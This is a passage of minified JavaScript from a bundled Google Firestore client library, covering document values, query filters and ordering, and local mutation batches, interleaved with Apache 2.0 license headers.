t=Object.keys(e.fields||{}).sort(),n="{",r=!0;for(let i of t)r?r=!1:n+=",",n+=`${i}:${li(e.fields[i])}`;return n+"}"}(e.mapValue):ur()}function ui(e,t){return{referenceValue:`projects/${e.projectId}/databases/${e.database}/documents/${t.path.canonicalString()}`}}function ci(e){return!!e&&"integerValue"in e}function hi(e){return!!e&&"arrayValue"in e}function di(e){return!!e&&"nullValue"in e}function fi(e){return!!e&&"doubleValue"in e&&isNaN(Number(e.doubleValue))}function pi(e){return!!e&&"mapValue"in e}function mi(e){if(e.geoPointValue)return{geoPointValue:Object.assign({},e.geoPointValue)};if(e.timestampValue&&"object"==typeof e.timestampValue)return{timestampValue:Object.assign({},e.timestampValue)};if(e.mapValue){let t={mapValue:{fields:{}}};return Ur(e.mapValue.fields,((e,n)=>t.mapValue.fields[e]=mi(n))),t}if(e.arrayValue){let t={arrayValue:{values:[]}};for(let n=0;n<(e.arrayValue.values||[]).length;++n)t.arrayValue.values[n]=mi(e.arrayValue.values[n]);return t}return Object.assign({},e)}function gi(e){return"__max__"===(((e.mapValue||{}).fields||{}).__type__||{}).stringValue}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yi{constructor(e){this.value=e}static empty(){return new yi({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let t=this.value;for(let n=0;n<e.length-1;++n)if(!pi(t=(t.mapValue.fields||{})[e.get(n)]))return null;return(t=(t.mapValue.fields||{})[e.lastSegment()])||null}}set(e,t){this.getFieldsMap(e.popLast())[e.lastSegment()]=mi(t)}setAll(e){let t=Nr.emptyPath(),n={},r=[];e.forEach(((e,i)=>{if(!t.isImmediateParentOf(i)){let e=this.getFieldsMap(t);this.applyChanges(e,n,r),n={},r=[],t=i.popLast()}e?n[i.lastSegment()]=mi(e):r.push(i.lastSegment())}));let i=this.getFieldsMap(t);this.applyChanges(i,n,r)}delete(e){let t=this.field(e.popLast());pi(t)&&t.mapValue.fields&&delete t.mapValue.fields[e.lastSegment()]}isEqual(e){return ii(this.value,e.value)}getFieldsMap(e){let t=this.value;t.mapValue.fields||(t.mapValue={fields:{}});for(let n=0;n<e.length;++n){let r=t.mapValue.fields[e.get(n)];pi(r)&&r.mapValue.fields||(r={mapValue:{fields:{}}},t.mapValue.fields[e.get(n)]=r),t=r}return t.mapValue.fields}applyChanges(e,t,n){for(let r of(Ur(t,((t,n)=>e[t]=n)),n))delete e[r]}clone(){return new yi(mi(this.value))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vi{constructor(e,t,n,r,i,s,a){this.key=e,this.documentType=t,this.version=n,this.readTime=r,this.createTime=i,this.data=s,this.documentState=a}static newInvalidDocument(e){return new vi(e,0,Sr.min(),Sr.min(),Sr.min(),yi.empty(),0)}static newFoundDocument(e,t,n,r){return new vi(e,1,t,Sr.min(),n,r,0)}static newNoDocument(e,t){return new vi(e,2,t,Sr.min(),Sr.min(),yi.empty(),0)}static newUnknownDocument(e,t){return new vi(e,3,t,Sr.min(),Sr.min(),yi.empty(),2)}convertToFoundDocument(e,t){return this.createTime.isEqual(Sr.min())&&(2===this.documentType||0===this.documentType)&&(this.createTime=e),this.version=e,this.documentType=1,this.data=t,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=yi.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=yi.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=Sr.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return 1===this.documentState}get hasCommittedMutations(){return 2===this.documentState}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return 0!==this.documentType}isFoundDocument(){return 1===this.documentType}isNoDocument(){return 2===this.documentType}isUnknownDocument(){return 3===this.documentType}isEqual(e){return e instanceof vi&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new vi(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wi{constructor(e,t){this.position=e,this.inclusive=t}}function bi(e,t,n){let r=0;for(let i=0;i<e.position.length;i++){let s=t[i],a=e.position[i];if(r=s.field.isKeyField()?Or.comparator(Or.fromName(a.referenceValue),n.key):ai(a,n.data.field(s.field)),"desc"===s.dir&&(r*=-1),0!==r)break}return r}function _i(e,t){if(null===e)return null===t;if(null===t||e.inclusive!==t.inclusive||e.position.length!==t.position.length)return!1;for(let n=0;n<e.position.length;n++)if(!ii(e.position[n],t.position[n]))return!1;return!0}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ii{constructor(e,t="asc"){this.field=e,this.dir=t
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Ei{}class Ti extends Ei{constructor(e,t,n){super(),this.field=e,this.op=t,this.value=n}static create(e,t,n){return e.isKeyField()?"in"===t||"not-in"===t?this.createKeyFieldInFilter(e,t,n):new Ci(e,t,n):"array-contains"===t?new Ri(e,n):"in"===t?new xi(e,n):"not-in"===t?new Pi(e,n):"array-contains-any"===t?new Li(e,n):new Ti(e,t,n)}static createKeyFieldInFilter(e,t,n){return"in"===t?new Ni(e,n):new Oi(e,n)}matches(e){let t=e.data.field(this.field);return"!="===this.op?null!==t&&this.matchesComparison(ai(t,this.value)):null!==t&&ri(this.value)===ri(t)&&this.matchesComparison(ai(t,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return 0===e;case"!=":return 0!==e;case">":return e>0;case">=":return e>=0;default:return ur()}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}getFirstInequalityField(){return this.isInequality()?this.field:null}}class Si extends Ei{constructor(e,t){super(),this.filters=e,this.op=t,this.ht=null}static create(e,t){return new Si(e,t)}matches(e){return ki(this)?void 0===this.filters.find((t=>!t.matches(e))):void 0!==this.filters.find((t=>t.matches(e)))}getFlattenedFilters(){return null!==this.ht||(this.ht=this.filters.reduce(((e,t)=>e.concat(t.getFlattenedFilters())),[])),this.ht}getFilters(){return Object.assign([],this.filters)}getFirstInequalityField(){let e=this.lt((e=>e.isInequality()));return null!==e?e.field:null}lt(e){for(let t of this.getFlattenedFilters())if(e(t))return t;return null}}function ki(e){return"and"===e.op}function Ai(e){for(let t of e.filters)if(t instanceof Si)return!1;return!0}class Ci extends Ti{constructor(e,t,n){super(e,t,n),this.key=Or.fromName(n.referenceValue)}matches(e){let t=Or.comparator(e.key,this.key);return this.matchesComparison(t)}}class Ni extends Ti{constructor(e,t){super(e,"in",t),this.keys=Di("in",t)}matches(e){return this.keys.some((t=>t.isEqual(e.key)))}}class Oi extends Ti{constructor(e,t){super(e,"not-in",t),this.keys=Di("not-in",t)}matches(e){return!this.keys.some((t=>t.isEqual(e.key)))}}function Di(e,t){var n;return((null===(n=t.arrayValue)||void 0===n?void 0:n.values)||[]).map((e=>Or.fromName(e.referenceValue)))}class Ri extends Ti{constructor(e,t){super(e,"array-contains",t)}matches(e){let t=e.data.field(this.field);return hi(t)&&si(t.arrayValue,this.value)}}class xi extends Ti{constructor(e,t){super(e,"in",t)}matches(e){let t=e.data.field(this.field);return null!==t&&si(this.value.arrayValue,t)}}class Pi extends Ti{constructor(e,t){super(e,"not-in",t)}matches(e){if(si(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;let t=e.data.field(this.field);return null!==t&&!si(this.value.arrayValue,t)}}class Li extends Ti{constructor(e,t){super(e,"array-contains-any",t)}matches(e){let t=e.data.field(this.field);return!(!hi(t)||!t.arrayValue.values)&&t.arrayValue.values.some((e=>si(this.value.arrayValue,e)))}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Mi{constructor(e,t=null,n=[],r=[],i=null,s=null,a=null){this.path=e,this.collectionGroup=t,this.orderBy=n,this.filters=r,this.limit=i,this.startAt=s,this.endAt=a,this.ft=null}}function Fi(e,t=null,n=[],r=[],i=null,s=null,a=null){return new Mi(e,t,n,r,i,s,a)}function Ui(e){let t=e;if(null===t.ft){let e=t.path.canonicalString();null!==t.collectionGroup&&(e+="|cg:"+t.collectionGroup),e+="|f:"+t.filters.map((e=>function e(t){if(t instanceof Ti)return t.field.canonicalString()+t.op.toString()+li(t.value);if(Ai(t)&&ki(t))return t.filters.map((t=>e(t))).join(",");{let n=t.filters.map((t=>e(t))).join(",");return`${t.op}(${n})`}}(e))).join(",")+"|ob:"+t.orderBy.map((e=>e.field.canonicalString()+e.dir)).join(","),null==t.limit||(e+="|l:"+t.limit),t.startAt&&(e+="|lb:"+(t.startAt.inclusive?"b:":"a:")+t.startAt.position.map((e=>li(e))).join(",")),t.endAt&&(e+="|ub:"+(t.endAt.inclusive?"a:":"b:")+t.endAt.position.map((e=>li(e))).join(",")),t.ft=e}return t.ft}function Vi(e,t){if(e.limit!==t.limit||e.orderBy.length!==t.orderBy.length)return!1;for(let i=0;i<e.orderBy.length;i++){var n,r;if(n=e.orderBy[i],r=t.orderBy[i],n.dir!==r.dir||!n.field.isEqual(r.field))return!1}if(e.filters.length!==t.filters.length)return!1;for(let n=0;n<e.filters.length;n++)if(!function e(t,n){return t instanceof Ti?n instanceof Ti&&t.op===n.op&&t.field.isEqual(n.field)&&ii(t.value,n.value):t instanceof Si?n instanceof Si&&t.op===n.op&&t.filters.length===n.filters.length&&t.filters.reduce(((t,r,i)=>t&&e(r,n.filters[i])),!0):void ur()}(e.filters[n],t.filters[n]))return!1;return e.collectionGroup===t.collectionGroup&&!!e.path.isEqual(t.path)&&!!_i(e.startAt,t.startAt)&&_i(e.endAt,t.endAt)}function ji(e){return Or.isDocumentKey(e.path)&&null===e.collectionGroup&&0===e.filters.length}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Bi{constructor(e,t=null,n=[],r=[],i=null,s="F",a=null,o=null){this.path=e,this.collectionGroup=t,this.explicitOrderBy=n,this.filters=r,this.limit=i,this.limitType=s,this.startAt=a,this.endAt=o,this.dt=null,this.wt=null,this.startAt,this.endAt}}function qi(e){return 0===e.filters.length&&null===e.limit&&null==e.startAt&&null==e.endAt&&(0===e.explicitOrderBy.length||1===e.explicitOrderBy.length&&e.explicitOrderBy[0].field.isKeyField())}function $i(e){return e.explicitOrderBy.length>0?e.explicitOrderBy[0].field:null}function zi(e){for(let t of e.filters){let e=t.getFirstInequalityField();if(null!==e)return e}return null}function Gi(e){return null!==e.collectionGroup}function Ki(e){let t=e;if(null===t.dt){t.dt=[];let e=zi(t),n=$i(t);if(null!==e&&null===n)e.isKeyField()||t.dt.push(new Ii(e)),t.dt.push(new Ii(Nr.keyField(),"asc"));else{let e=!1;for(let n of t.explicitOrderBy)t.dt.push(n),n.field.isKeyField()&&(e=!0);if(!e){let e=t.explicitOrderBy.length>0?t.explicitOrderBy[t.explicitOrderBy.length-1].dir:"asc";t.dt.push(new Ii(Nr.keyField(),e))}}}return t.dt}function Hi(e){let t=e;if(!t.wt)if("F"===t.limitType)t.wt=Fi(t.path,t.collectionGroup,Ki(t),t.filters,t.limit,t.startAt,t.endAt);else{let e=[];for(let n of Ki(t)){let t="desc"===n.dir?"asc":"desc";e.push(new Ii(n.field,t))}let n=t.endAt?new wi(t.endAt.position,t.endAt.inclusive):null,r=t.startAt?new wi(t.startAt.position,t.startAt.inclusive):null;t.wt=Fi(t.path,t.collectionGroup,e,t.filters,t.limit,n,r)}return t.wt}function Wi(e,t){t.getFirstInequalityField(),zi(e);let n=e.filters.concat([t]);return new Bi(e.path,e.collectionGroup,e.explicitOrderBy.slice(),n,e.limit,e.limitType,e.startAt,e.endAt)}function Qi(e,t,n){return new Bi(e.path,e.collectionGroup,e.explicitOrderBy.slice(),e.filters.slice(),t,n,e.startAt,e.endAt)}function Ji(e,t){return Vi(Hi(e),Hi(t))&&e.limitType===t.limitType}function Xi(e){return`${Ui(Hi(e))}|lt:${e.limitType}`}function Yi(e){var t;let n;return`Query(target=${n=(t=Hi(e)).path.canonicalString(),null!==t.collectionGroup&&(n+=" collectionGroup="+t.collectionGroup),t.filters.length>0&&(n+=`, filters: [${t.filters.map((e=>function e(t){return t instanceof Ti?`${t.field.canonicalString()} ${t.op} ${li(t.value)}`:t instanceof Si?t.op.toString()+" {"+t.getFilters().map(e).join(" ,")+"}":"Filter"}(e))).join(", ")}]`),null==t.limit||(n+=", limit: "+t.limit),t.orderBy.length>0&&(n+=`, orderBy: [${t.orderBy.map((e=>`${e.field.canonicalString()} (${e.dir})`)).join(", ")}]`),t.startAt&&(n+=", startAt: "+(t.startAt.inclusive?"b:":"a:")+t.startAt.position.map((e=>li(e))).join(",")),t.endAt&&(n+=", endAt: "+(t.endAt.inclusive?"a:":"b:")+t.endAt.position.map((e=>li(e))).join(",")),`Target(${n})`}; limitType=${e.limitType})`}function Zi(e,t){return t.isFoundDocument()&&function(e,t){let n=t.key.path;return null!==e.collectionGroup?t.key.hasCollectionId(e.collectionGroup)&&e.path.isPrefixOf(n):Or.isDocumentKey(e.path)?e.path.isEqual(n):e.path.isImmediateParentOf(n)}(e,t)&&function(e,t){for(let n of Ki(e))if(!n.field.isKeyField()&&null===t.data.field(n.field))return!1;return!0}(e,t)&&function(e,t){for(let n of e.filters)if(!n.matches(t))return!1;return!0}(e,t)&&(!e.startAt||!!function(e,t,n){let r=bi(e,t,n);return e.inclusive?r<=0:r<0}(e.startAt,Ki(e),t))&&(!e.endAt||!!function(e,t,n){let r=bi(e,t,n);return e.inclusive?r>=0:r>0}(e.endAt,Ki(e),t))}function es(e){return(t,n)=>{let r=!1;for(let i of Ki(e)){let e=function(e,t,n){let r=e.field.isKeyField()?Or.comparator(t.key,n.key):function(e,t,n){let r=t.data.field(e),i=n.data.field(e);return null!==r&&null!==i?ai(r,i):ur()}(e.field,t,n);switch(e.dir){case"asc":return r;case"desc":return-1*r;default:return ur()}}(i,t,n);if(0!==e)return e;r=r||i.field.isKeyField()}return 0}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ts{constructor(e,t){this.mapKeyFn=e,this.equalsFn=t,this.inner={},this.innerSize=0}get(e){let t=this.mapKeyFn(e),n=this.inner[t];if(void 0!==n)for(let[t,r]of n)if(this.equalsFn(t,e))return r}has(e){return void 0!==this.get(e)}set(e,t){let n=this.mapKeyFn(e),r=this.inner[n];if(void 0===r)return this.inner[n]=[[e,t]],void this.innerSize++;for(let n=0;n<r.length;n++)if(this.equalsFn(r[n][0],e))return void(r[n]=[e,t]);r.push([e,t]),this.innerSize++}delete(e){let t=this.mapKeyFn(e),n=this.inner[t];if(void 0===n)return!1;for(let r=0;r<n.length;r++)if(this.equalsFn(n[r][0],e))return 1===n.length?delete this.inner[t]:n.splice(r,1),this.innerSize--,!0;return!1}forEach(e){Ur(this.inner,((t,n)=>{for(let[t,r]of n)e(t,r)}))}isEmpty(){return Vr(this.inner)}size(){return this.innerSize}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let ns=new jr(Or.comparator),rs=new jr(Or.comparator);function is(...e){let t=rs;for(let n of e)t=t.insert(n.key,n);return t}function ss(e){let t=rs;return e.forEach(((e,n)=>t=t.insert(e,n.overlayedDocument))),t}function as(){return new ts((e=>e.toString()),((e,t)=>e.isEqual(t)))}let os=new jr(Or.comparator),ls=new $r(Or.comparator);function us(...e){let t=ls;for(let n of e)t=t.add(n);return t}let cs=new $r(Ir);
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function hs(e,t){if(e.useProto3Json){if(isNaN(t))return{doubleValue:"NaN"};if(t===1/0)return{doubleValue:"Infinity"};if(t===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:Mr(t)?"-0":t}}function ds(e){return{integerValue:""+e}}
/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class fs{constructor(){this._=void 0}}function ps(e,t){return e instanceof bs?ci(t)||t&&"doubleValue"in t?t:{integerValue:0}:null}class ms extends fs{}class gs extends fs{constructor(e){super(),this.elements=e}}function ys(e,t){let n=Is(t);for(let t of e.elements)n.some((e=>ii(e,t)))||n.push(t);return{arrayValue:{values:n}}}class vs extends fs{constructor(e){super(),this.elements=e}}function ws(e,t){let n=Is(t);for(let t of e.elements)n=n.filter((e=>!ii(e,t)));return{arrayValue:{values:n}}}class bs extends fs{constructor(e,t){super(),this.serializer=e,this._t=t}}function _s(e){return Jr(e.integerValue||e.doubleValue)}function Is(e){return hi(e)&&e.arrayValue.values?e.arrayValue.values.slice():[]}class Es{constructor(e,t){this.version=e,this.transformResults=t}}class Ts{constructor(e,t){this.updateTime=e,this.exists=t}static none(){return new Ts}static exists(e){return new Ts(void 0,e)}static updateTime(e){return new Ts(e)}get isNone(){return void 0===this.updateTime&&void 0===this.exists}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function Ss(e,t){return void 0!==e.updateTime?t.isFoundDocument()&&t.version.isEqual(e.updateTime):void 0===e.exists||e.exists===t.isFoundDocument()}class ks{}function As(e,t){if(!e.hasLocalMutations||t&&0===t.fields.length)return null;if(null===t)return e.isNoDocument()?new Ls(e.key,Ts.none()):new Os(e.key,e.data,Ts.none());{let n=e.data,r=yi.empty(),i=new $r(Nr.comparator);for(let e of t.fields)if(!i.has(e)){let t=n.field(e);null===t&&e.length>1&&(e=e.popLast(),t=n.field(e)),null===t?r.delete(e):r.set(e,t),i=i.add(e)}return new Ds(e.key,r,new Gr(i.toArray()),Ts.none())}}function Cs(e,t,n,r){return e instanceof Os?function(e,t,n,r){if(!Ss(e.precondition,t))return n;let i=e.value.clone(),s=Ps(e.fieldTransforms,r,t);return i.setAll(s),t.convertToFoundDocument(t.version,i).setHasLocalMutations(),null}(e,t,n,r):e instanceof Ds?function(e,t,n,r){if(!Ss(e.precondition,t))return n;let i=Ps(e.fieldTransforms,r,t),s=t.data;return s.setAll(Rs(e)),s.setAll(i),t.convertToFoundDocument(t.version,s).setHasLocalMutations(),null===n?null:n.unionWith(e.fieldMask.fields).unionWith(e.fieldTransforms.map((e=>e.field)))}(e,t,n,r):Ss(e.precondition,t)?(t.convertToNoDocument(t.version).setHasLocalMutations(),null):n}function Ns(e,t){var n,r;return e.type===t.type&&!!e.key.isEqual(t.key)&&!!e.precondition.isEqual(t.precondition)&&(n=e.fieldTransforms,r=t.fieldTransforms,!!(void 0===n&&void 0===r||n&&r&&Er(n,r,((e,t)=>{var n,r;return e.field.isEqual(t.field)&&(n=e.transform,r=t.transform,n instanceof gs&&r instanceof gs||n instanceof vs&&r instanceof vs?Er(n.elements,r.elements,ii):n instanceof bs&&r instanceof bs?ii(n._t,r._t):n instanceof ms&&r instanceof ms)}))))&&(0===e.type?e.value.isEqual(t.value):1!==e.type||e.data.isEqual(t.data)&&e.fieldMask.isEqual(t.fieldMask))}class Os extends ks{constructor(e,t,n,r=[]){super(),this.key=e,this.value=t,this.precondition=n,this.fieldTransforms=r,this.type=0}getFieldMask(){return null}}class Ds extends ks{constructor(e,t,n,r,i=[]){super(),this.key=e,this.data=t,this.fieldMask=n,this.precondition=r,this.fieldTransforms=i,this.type=1}getFieldMask(){return this.fieldMask}}function Rs(e){let t=new Map;return e.fieldMask.fields.forEach((n=>{if(!n.isEmpty()){let r=e.data.field(n);t.set(n,r)}})),t}function xs(e,t,n){var r;let i=new Map;e.length===n.length||ur();for(let s=0;s<n.length;s++){let a=e[s],o=a.transform,l=t.data.field(a.field);i.set(a.field,(r=n[s],o instanceof gs?ys(o,l):o instanceof vs?ws(o,l):r))}return i}function Ps(e,t,n){let r=new Map;for(let i of e){let e=i.transform,s=n.data.field(i.field);r.set(i.field,e instanceof ms?function(e,t){let n={fields:{__type__:{stringValue:"server_timestamp"},__local_write_time__:{timestampValue:{seconds:e.seconds,nanos:e.nanoseconds}}}};return t&&(n.fields.__previous_value__=t),{mapValue:n}}(t,s):e instanceof gs?ys(e,s):e instanceof vs?ws(e,s):function(e,t){let n=ps(e,t),r=_s(n)+_s(e._t);return ci(n)&&ci(e._t)?ds(r):hs(e.serializer,r)}(e,s))}return r}class Ls extends ks{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class Ms extends ks{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fs{constructor(e,t,n,r){this.batchId=e,this.localWriteTime=t,this.baseMutations=n,this.mutations=r}applyToRemoteDocument(e,t){let n=t.mutationResults;for(let t=0;t<this.mutations.length;t++){let i=this.mutations[t];var r;if(i.key.isEqual(e.key))r=n[t],i instanceof Os?function(e,t,n){let r=e.value.clone(),i=xs(e.fieldTransforms,t,n.transformResults);r.setAll(i),t.convertToFoundDocument(n.version,r).setHasCommittedMutations()}(i,e,r):i instanceof Ds?function(e,t,n){if(!Ss(e.precondition,t))return void t.convertToUnknownDocument(n.version);let r=xs(e.fieldTransforms,t,n.transformResults),i=t.data;i.setAll(Rs(e)),i.setAll(r),t.convertToFoundDocument(n.version,i).setHasCommittedMutations()}(i,e,r):function(e,t,n){t.convertToNoDocument(n.version).setHasCommittedMutations()}(0,e,r)}}applyToLocalView(e,t){for(let n of this.baseMutations)n.key.isEqual(e.key)&&(t=Cs(n,e,t,this.localWriteTime));for(let n of this.mutations)n.key.isEqual(e.key)&&(t=Cs(n,e,t,this.localWriteTime));return t}applyToLocalDocumentSet(e,t){let n=as();return this.mutations.forEach((r=>{let i=e.get(r.key),s=i.overlayedDocument,a=this.applyToLocalView(s,i.mutatedFields);a=t.has(r.key)?null:a;let o=As(s,a);null!==o&&n.set(r.key,o),s.isValidDocument()||s.convertToNoDocument(Sr.min())})),n}keys(){return this.mutations.reduce(((e,t)=>e.add(t.key)),us())}isEqual(e){return this.batchId===e.batchId&&Er(this.mutations,e.mutations,((e,t)=>Ns(e,t)))&&Er(this.baseMutations,e.baseMutations,((e,t)=>Ns(e,t)))}}class Us{constructor(e,t,n,r){this.batch=e,this.commitVersion=t,this.mutationResults=n,this.docVersions=r}static from(e,t,n){e.mutations.length===n.length||ur();let r=os,i=e.mutations;for(let e=0;e<i.length;e++)r=r.insert(i[e].key,n[e].version);return new Us(e,t,n,r)}}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vs{constructor(e,t){this.largestBatchId=e,this.mutation=t}getKey(){return this.mutation.key}isEqual(e){return null!==e&&this.mutation===e.mutation}toString(){return`Overlay{\n      largestBatchId: ${this.largestBatchId},\n      mutation: ${this.mutation.toString()}\n    }`}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
